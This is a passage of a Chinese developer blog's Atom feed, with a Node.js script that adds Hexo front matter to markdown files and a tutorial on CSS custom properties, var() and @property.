class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> join = path.<span class="property">join</span></span><br><span class="line"><span class="keyword">const</span> regx = <span class="regexp">/\.md$/</span></span><br><span class="line"><span class="keyword">let</span> url = <span class="title function_">join</span>(__dirname, <span class="string">&#x27;/&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">isFold</span> = fileName =&gt; &#123;</span><br><span class="line">  <span class="keyword">return</span> !fs.<span class="title function_">lstatSync</span>(fileName).<span class="title function_">isFile</span>();</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getFoldName</span> (str) &#123;</span><br><span class="line">  <span class="keyword">return</span> str.<span class="title function_">substring</span>(str.<span class="title function_">lastIndexOf</span>(<span class="string">&quot;\\&quot;</span>) + <span class="number">1</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> cates = []</span><br><span class="line"><span class="keyword">const</span> tree = &#123;&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getDirs</span> (_path) &#123;</span><br><span class="line">  <span class="keyword">const</span> paths = fs.<span class="title function_">readdirSync</span>(_path)</span><br><span class="line">    .<span class="title function_">map</span>(<span class="function"><span class="params">fileName</span> =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">const</span> p = <span class="title function_">join</span>(_path, fileName)</span><br><span class="line">      <span class="keyword">const</span> check = <span class="title function_">isFold</span>(p)</span><br><span class="line">      <span class="keyword">if</span> (check) &#123;</span><br><span class="line">        cates.<span class="title function_">push</span>(fileName)</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">const</span> data = &#123;</span><br><span class="line">        <span class="attr">parent</span>: _path,</span><br><span class="line">        <span class="attr">parentName</span>: check ? <span class="string">&#x27;&#x27;</span> : <span class="title function_">getFoldName</span>(_path),</span><br><span class="line">        <span class="attr">path</span>: p,</span><br><span class="line">        <span class="attr">fileName</span>: fileName.<span class="title function_">substring</span>(<span class="number">0</span>, fileName.<span class="title function_">lastIndexOf</span>(<span class="string">&quot;.&quot;</span>)),</span><br><span class="line">        <span class="attr">ext</span>: check ? <span class="string">&#x27;&#x27;</span> : fileName.<span class="title function_">substring</span>(fileName.<span class="title function_">lastIndexOf</span>(<span class="string">&quot;.&quot;</span>)),</span><br><span class="line">        <span class="attr">isFold</span>: check</span><br><span class="line">      &#125;</span><br><span class="line">      tree[p] = data</span><br><span class="line">      <span class="keyword">return</span> data</span><br><span class="line">    &#125;)</span><br><span class="line">  <span class="keyword">if</span> (paths &amp;&amp; paths.<span class="property">length</span>) &#123;</span><br><span class="line">    paths.<span class="title function_">filter</span>(<span class="function"><span class="params">item</span> =&gt;</span> item.<span class="property">isFold</span>)</span><br><span class="line">      .<span class="title function_">forEach</span>(<span class="function"><span class="params">item</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="title function_">getDirs</span>(item.<span class="property">path</span>)</span><br><span class="line">      &#125;)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">getDirs</span>(url)</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getTime</span> () &#123;</span><br><span class="line">  <span class="keyword">var</span> time = <span class="keyword">new</span> <span class="title class_">Date</span>();</span><br><span class="line">  <span class="keyword">var</span> Y = time.<span class="title function_">getFullYear</span>();</span><br><span class="line">  <span class="keyword">var</span> M = time.<span class="title function_">getMonth</span>();</span><br><span class="line">  M = (M + <span class="number">1</span>) &lt; <span class="number">10</span> ? <span class="string">&#x27;0&#x27;</span> + (M + <span class="number">1</span>) : (M + <span class="number">1</span>);  <span class="comment">//这里月份加1的原因是因为月份是从0开始的，0-11月，加1让月份从1-12月区间。</span></span><br><span class="line">  <span class="keyword">var</span> d = time.<span class="title function_">getDate</span>();</span><br><span class="line">  d = d &lt; <span class="number">10</span> ? <span class="string">&#x27;0&#x27;</span> + d : d;</span><br><span class="line">  <span class="keyword">var</span> h = time.<span class="title function_">getHours</span>();</span><br><span class="line">  h = h &lt; <span class="number">10</span> ? <span class="string">&#x27;0&#x27;</span> + h : h;</span><br><span class="line">  <span class="keyword">var</span> m = time.<span class="title function_">getMinutes</span>();</span><br><span class="line">  m = m &lt; <span class="number">10</span> ? <span class="string">&#x27;0&#x27;</span> + m : m;</span><br><span class="line">  <span class="keyword">var</span> s = time.<span class="title function_">getSeconds</span>();</span><br><span class="line">  s = m &lt; <span class="number">10</span> ? <span class="string">&#x27;0&#x27;</span> + m : m;</span><br><span class="line">  <span class="keyword">return</span> Y + <span class="string">&quot;-&quot;</span> + M + <span class="string">&quot;-&quot;</span> + d + <span class="string">&quot; &quot;</span> + h + <span class="string">&quot;:&quot;</span> + m + <span class="string">&quot;:&quot;</span> + s;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> i = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">const</span> key <span class="keyword">in</span> tree) &#123;</span><br><span class="line">  <span class="keyword">const</span> d = tree[key]</span><br><span class="line">  <span class="keyword">if</span> (!d.<span class="property">isFold</span> &amp;&amp; regx.<span class="title function_">test</span>(d.<span class="property">ext</span>)) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="keyword">const</span> data = fs.<span class="title function_">readFileSync</span>(d.<span class="property">path</span>, <span class="string">&#x27;utf8&#x27;</span>);</span><br><span class="line">      <span class="keyword">const</span> str = <span class="string">`</span></span><br><span class="line"><span class="string">---</span></span><br><span class="line"><span class="string">title: <span class="subst">$&#123;d.fileName&#125;</span></span></span><br><span class="line"><span class="string">date: <span class="subst">$&#123;getTime()&#125;</span></span></span><br><span class="line"><span class="string">description: <span class="subst">$&#123;d.fileName&#125;</span></span></span><br><span class="line"><span class="string">categories: <span class="subst">$&#123;d.parentName&#125;</span></span></span><br><span class="line"><span class="string">tags: [<span class="subst">$&#123;d.parentName&#125;</span>]</span></span><br><span class="line"><span class="string">---</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"><span class="subst">$&#123;data&#125;</span></span></span><br><span class="line"><span class="string">      `</span></span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;readdirSync&#x27;</span>, str);</span><br><span class="line">      fs.<span class="title function_">writeFile</span>(d.<span class="property">path</span>, str, <span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (err) <span class="keyword">return</span> <span class="variable language_">console</span>.<span class="title function_">log</span>(err)</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;write ok&#x27;</span>)</span><br><span class="line">      &#125;)</span><br><span class="line">    &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;readdirSync----error&#x27;</span>, err);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">HEXO + github 搭建博客的一些注意事项</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>CSS变量和@property</title>
    <link href="https://hisai3.github.io/hisai3.github.io/2023/01/14/CSS%E5%8F%98%E9%87%8F/"/>
    <id>https://hisai3.github.io/hisai3.github.io/2023/01/14/CSS%E5%8F%98%E9%87%8F/</id>
    <published>2023-01-14T06:31:31.000Z</published>
    <updated>2023-04-13T04:00:05.417Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CSS变量和-property"><a href="#CSS变量和-property" class="headerlink" title="CSS变量和@property"></a>CSS变量和@property</h1><h2 id="CSS变量-var"><a href="#CSS变量-var" class="headerlink" title="CSS变量 var()"></a>CSS变量 var()</h2><p>CSS 变量是由CSS作者定义的实体，其中包含要在整个文档中重复使用的特定值。使用<a href="https://so.csdn.net/so/search?q=%E8%87%AA%E5%AE%9A%E4%B9%89%E5%B1%9E%E6%80%A7&spm=1001.2101.3001.7020">自定义属性</a>来设置变量名，并使用特定的 <strong>var()</strong> 来访问。（比如  color: <strong>var(–main-color)</strong>;）。</p><h3 id="基本用法"><a href="#基本用法" class="headerlink" title="基本用法"></a><strong>基本用法</strong></h3><blockquote><p><strong>CSS变量定义的作用域只在定义该变量的元素及其后代元素中有效</strong>。如果需要在整个页面中使用该变量，可以将其定义在:root中</p></blockquote><p>声明一个<strong>局部</strong>变量：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">element &#123;</span><br><span class="line">--main-bg-color: brown;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用一个<strong>局部</strong>变量：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">element &#123;</span><br><span class="line">background-color: var(--main-bg-color);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/:root">Mdn Web Docs</a></p><p>声明一个 <strong>全局</strong> CSS 变量：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-pseudo">:root</span> &#123;</span><br><span class="line">    <span class="attr">--global-color</span>: <span class="number">#666</span>;</span><br><span class="line">    <span class="attr">--pane-padding</span>: <span class="number">5px</span> <span class="number">42px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用一个 <strong>全局</strong> CSS 变量：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.demo</span>&#123;<span class="attribute">color</span>: <span class="built_in">var</span>(--global-color);&#125;</span><br></pre></td></tr></table></figure><h3 id="开始使用CSS变量"><a href="#开始使用CSS变量" class="headerlink" title="开始使用CSS变量"></a><strong>开始使用CSS变量</strong></h3><p>让我们从这个简单的例子开始，拥有不同类名的元素有相同的颜色：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.one</span> &#123;</span><br><span class="line">    <span class="attribute">color</span>: white;</span><br><span class="line">    <span class="attribute">background-color</span>: brown;</span><br><span class="line">    <span class="attribute">margin</span>: <span class="number">10px</span>;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">50px</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">50px</span>;</span><br><span class="line">    <span class="attribute">display</span>: inline-block;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="selector-class">.two</span> &#123;</span><br><span class="line">    <span class="attribute">color</span>: white;</span><br><span class="line">    <span class="attribute">background-color</span>: black;</span><br><span class="line">    <span class="attribute">margin</span>: <span class="number">10px</span>;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">150px</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">70px</span>;</span><br><span class="line">    <span class="attribute">display</span>: inline-block;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.three</span> &#123;</span><br><span class="line">    <span class="attribute">color</span>: white;</span><br><span class="line">    <span class="attribute">background-color</span>: brown;</span><br><span class="line">    <span class="attribute">margin</span>: <span class="number">10px</span>;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">75px</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.four</span> &#123;</span><br><span class="line">    <span class="attribute">color</span>: white;</span><br><span class="line">    <span class="attribute">background-color</span>: brown;</span><br><span class="line">    <span class="attribute">margin</span>: <span class="number">10px</span>;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">100px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="selector-class">.five</span> &#123;</span><br><span class="line"><span class="attribute">background-color</span>: brown;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>把它应用到下面这段HTML：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;one&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;two&quot;</span>&gt;</span>Text <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;five&quot;</span>&gt;</span>- more text<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">class</span>=<span class="string">&quot;three&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">textarea</span> <span class="attr">class</span>=<span class="string">&quot;four&quot;</span>&gt;</span>Lorem Ipsum<span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>注意CSS中重复的地方，brown的背景色作用在不同的元素上面。我们可以将背景色定义在更高的层级，然后通过CSS继承解决这个问题。在某些情况下，这种方法不一定可行。定义一个变量在:root<a href="https://so.csdn.net/so/search?q=%E4%BC%AA%E7%B1%BB&spm=1001.2101.3001.7020">伪类</a>上，使用变量来减少重复的代码。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-pseudo">:root</span> &#123;</span><br><span class="line">    <span class="attr">--main-bg-color</span>: brown;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="selector-class">.one</span> &#123;</span><br><span class="line">    <span class="attribute">color</span>: white;</span><br><span class="line">    <span class="attribute">background-color</span>: <span class="built_in">var</span>(--main-bg-color);</span><br><span class="line">    <span class="attribute">margin</span>: <span class="number">10px</span>;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">50px</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">50px</span>;</span><br><span class="line">    <span class="attribute">display</span>: inline-block;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="selector-class">.two</span> &#123;</span><br><span class="line">    <span class="attribute">color</span>: white;</span><br><span class="line">    <span class="attribute">background-color</span>: black;</span><br><span class="line">    <span class="attribute">margin</span>: <span class="number">10px</span>;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">150px</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">70px</span>;</span><br><span class="line">    <span class="attribute">display</span>: inline-block;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.three</span> &#123;</span><br><span class="line">    <span class="attribute">color</span>: white;</span><br><span class="line">    <span class="attribute">background-color</span>: <span class="built_in">var</span>(--main-bg-color);</span><br><span class="line">    <span class="attribute">margin</span>: <span class="number">10px</span>;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">75px</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.four</span> &#123;</span><br><span class="line">    <span class="attribute">color</span>: white;</span><br><span class="line">    <span class="attribute">background-color</span>: <span class="built_in">var</span>(--main-bg-color);</span><br><span class="line">    <span class="attribute">margin</span>: <span class="number">10px</span>;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">100px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="selector-class">.five</span> &#123;</span><br><span class="line"><span class="attribute">background-color</span>: <span class="built_in">var</span>(--main-bg-color);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>只需要规范地声明所需的属性，就能得到和上面例子相同的结果</p><h3 id="CSS变量的继承"><a href="#CSS变量的继承" class="headerlink" title="CSS变量的继承"></a><strong>CSS变量的继承</strong></h3><p>自定义属性同样支持继承。一个元素上没有定义自定义属性，该自定义属性的值会继承其父元素：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;div class=&quot;one&quot;&gt;</span><br><span class="line">    &lt;div class=&quot;two&quot;&gt;</span><br><span class="line">        &lt;div class=&quot;three&quot;&gt;&lt;/div&gt;</span><br><span class="line">        &lt;div class=&quot;four&quot;&gt;&lt;/div&gt;</span><br><span class="line">    &lt;div&gt;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure><p>定义下面的CSS：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.two</span> &#123; <span class="attr">--test</span>: <span class="number">10px</span>; &#125;</span><br><span class="line"><span class="selector-class">.three</span> &#123; <span class="attr">--test</span>: <span class="number">2em</span>; &#125;</span><br></pre></td></tr></table></figure><p>在这个例子中，<code>var(--test)的结果是：</code></p><ul><li><code>class=&quot;two&quot;</code> 对应的节点: <code>10px</code></li><li><code>class=&quot;three&quot; 对应的节点</code>: element: <code>2em</code></li><li><code>class=&quot;four&quot;</code> 对应的节点: <code>10px</code> (inherited from its parent)</li><li><code>class=&quot;one&quot;</code> 对应的节点: <em>无效值</em>, 即此属性值为未被自定义css变量覆盖的默认值</li></ul><h3 id="在JS中修改变量"><a href="#在JS中修改变量" class="headerlink" title="在JS中修改变量"></a>在JS中修改变量</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 获取根元素</span></span><br><span class="line"><span class="keyword">var</span> r = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;:root&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建获取变量值的函数</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">myFunction_get</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="comment">// Get the styles (properties and values) for the root</span></span><br><span class="line">  <span class="keyword">var</span> rs = <span class="title function_">getComputedStyle</span>(r);</span><br><span class="line">  <span class="comment">// Alert the value of the --blue variable</span></span><br><span class="line">  <span class="title function_">alert</span>(<span class="string">&quot;The value of --blue is: &quot;</span> + rs.<span class="title function_">getPropertyValue</span>(<span class="string">&#x27;--blue&#x27;</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建设置变量值的函数</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">myFunction_set</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="comment">// Set the value of variable --blue to another value (in this case &quot;lightblue&quot;)</span></span><br><span class="line">  r.<span class="property">style</span>.<span class="title function_">setProperty</span>(<span class="string">&#x27;--blue&#x27;</span>, <span class="string">&#x27;lightblue&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="在Vue中配合数据动态修改css变量"><a href="#在Vue中配合数据动态修改css变量" class="headerlink" title="在Vue中配合数据动态修改css变量"></a>在Vue中配合数据动态修改css变量</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">    &lt;div&gt;</span><br><span class="line">        &lt;span v-for=&quot;item in list&quot; :style=&quot;&#123;&#x27;--text&#x27;: item.text, &#x27;--color&#x27;: item.color&#125;&quot;&gt;&lt;/span&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">export default &#123;</span><br><span class="line">    name: &#x27;&#x27;,</span><br><span class="line">    components: &#123;&#125;,</span><br><span class="line">    props: &#123;&#125;,</span><br><span class="line">    data() &#123;</span><br><span class="line">        return &#123;</span><br><span class="line">            list: [</span><br><span class="line">                &#123; text: &#x27;&quot;中&quot;&#x27;, color: &#x27;red&#x27; &#125;,</span><br><span class="line">                &#123; text: &#x27;&quot;华&quot;&#x27;, color: &#x27;orange&#x27; &#125;,</span><br><span class="line">                &#123; text: &#x27;&quot;人&quot;&#x27;, color: &#x27;yellow&#x27; &#125;,</span><br><span class="line">                &#123; text: &#x27;&quot;民&quot;&#x27;, color: &#x27;orange&#x27; &#125;,</span><br><span class="line">                &#123; text: &#x27;&quot;共&quot;&#x27;, color: &#x27;green&#x27; &#125;,</span><br><span class="line">                &#123; text: &#x27;&quot;和&quot;&#x27;, color: &#x27;cyan&#x27; &#125;,</span><br><span class="line">                &#123; text: &#x27;&quot;国&quot;&#x27;, color: &#x27;blue&#x27; &#125;</span><br><span class="line">            ]</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style lang=&quot;scss&quot; scoped&gt;</span><br><span class="line">span::after &#123;</span><br><span class="line">    content: var(--text);</span><br><span class="line">    background-color: var(--color);</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure><h2 id="property"><a href="#property" class="headerlink" title="@property"></a>@property</h2><p><a href="https://blog.csdn.net/BASK2311/article/details/128048131">原文</a></p><p>使用模板：</p><ul><li><p>@property –property-name 中的 –property-name 就是自定义属性的名称，定义后可在 CSS 中通过 var(–property-name) 进行引用</p></li><li><p>syntax：该自定义属性的语法规则，也可以理解为表示定义的自定义属性的类型</p><ul><li><p>支持的 <strong>syntax</strong> 语法类型:</p><blockquote><ul><li>length</li><li>number</li><li>percentage</li><li>length-percentage</li><li>color</li><li>image</li><li>url</li><li>integer</li><li>angle</li><li>time</li><li>resolution</li><li>transform-list</li><li>transform-function</li><li>custom-ident (a custom identifier string)</li></ul></blockquote></li><li><p>syntax 中的 <code>+</code>、<code>#</code>、<code>|</code> 符号</p><blockquote><ul><li><code>syntax: &#39;&lt;color&gt;#&#39;</code> ：接受逗号分隔的颜色值列表 –img-url:url(img01.png),url(img02.png);</li><li><code>syntax: &#39;&lt;length&gt;+&#39;</code> ：接受以空格分隔的长度值列表  –padding:0 10px;</li><li><code>syntax: &#39;&lt;length&gt; | &lt;length&gt;+&#39;</code>：接受单个长度或者以空格分隔的长度值列表</li><li><code>syntax:  &#39;&lt;percentage&gt; | &lt;angle&gt;&#39;;</code>  使用百分比也可以使用角度</li></ul></blockquote></li></ul></li><li><p>inherits：是否允许继承</p></li><li><p>initial-value：初始值</p></li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="keyword">@property</span> --property-name &#123;</span></span><br><span class="line"><span class="language-css">  syntax: <span class="string">&#x27;&lt;color&gt;&#x27;</span>;</span></span><br><span class="line"><span class="language-css">  inherits: false;</span></span><br><span class="line"><span class="language-css">  initial-value: <span class="number">#fff</span>;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"> </span></span><br><span class="line"><span class="language-css"><span class="selector-tag">p</span> &#123;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">color</span>: <span class="built_in">var</span>(--property-name);</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure><p>在 <code>script</code> 中使用  <code>CSS.registerProperty</code></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="variable constant_">CSS</span>.<span class="title function_">registerProperty</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">  <span class="attr">name</span>: <span class="string">&quot;--property-name&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">  <span class="attr">syntax</span>: <span class="string">&quot;&lt;color&gt;&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">  <span class="attr">inherits</span>: <span class="literal">false</span>,</span></span><br><span class="line"><span class="language-javascript">  <span class="attr">initialValue</span>: <span class="string">&quot;#c0ffee&quot;</span></span></span><br><span class="line"><span class="language-javascript">&#125;);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">css实现table表头和列固定功能</summary>
    
    
    
    <category term="css" scheme="https://hisai3.github.io/hisai3.github.io/categories/css/"/>
    
    
    <category term="css" scheme="https://hisai3.github.io/hisai3.github.io/tags/css/"/>
    
  </entry>
  
  <entry>
    <title>Css响应式布局grid</title>
    <link href="https://hisai3.github.io/hisai3.github.io/2023/01/14/Css%E5%93%8D%E5%BA%94%E5%BC%8F%E5%B8%83%E5%B1%80grid/"/>
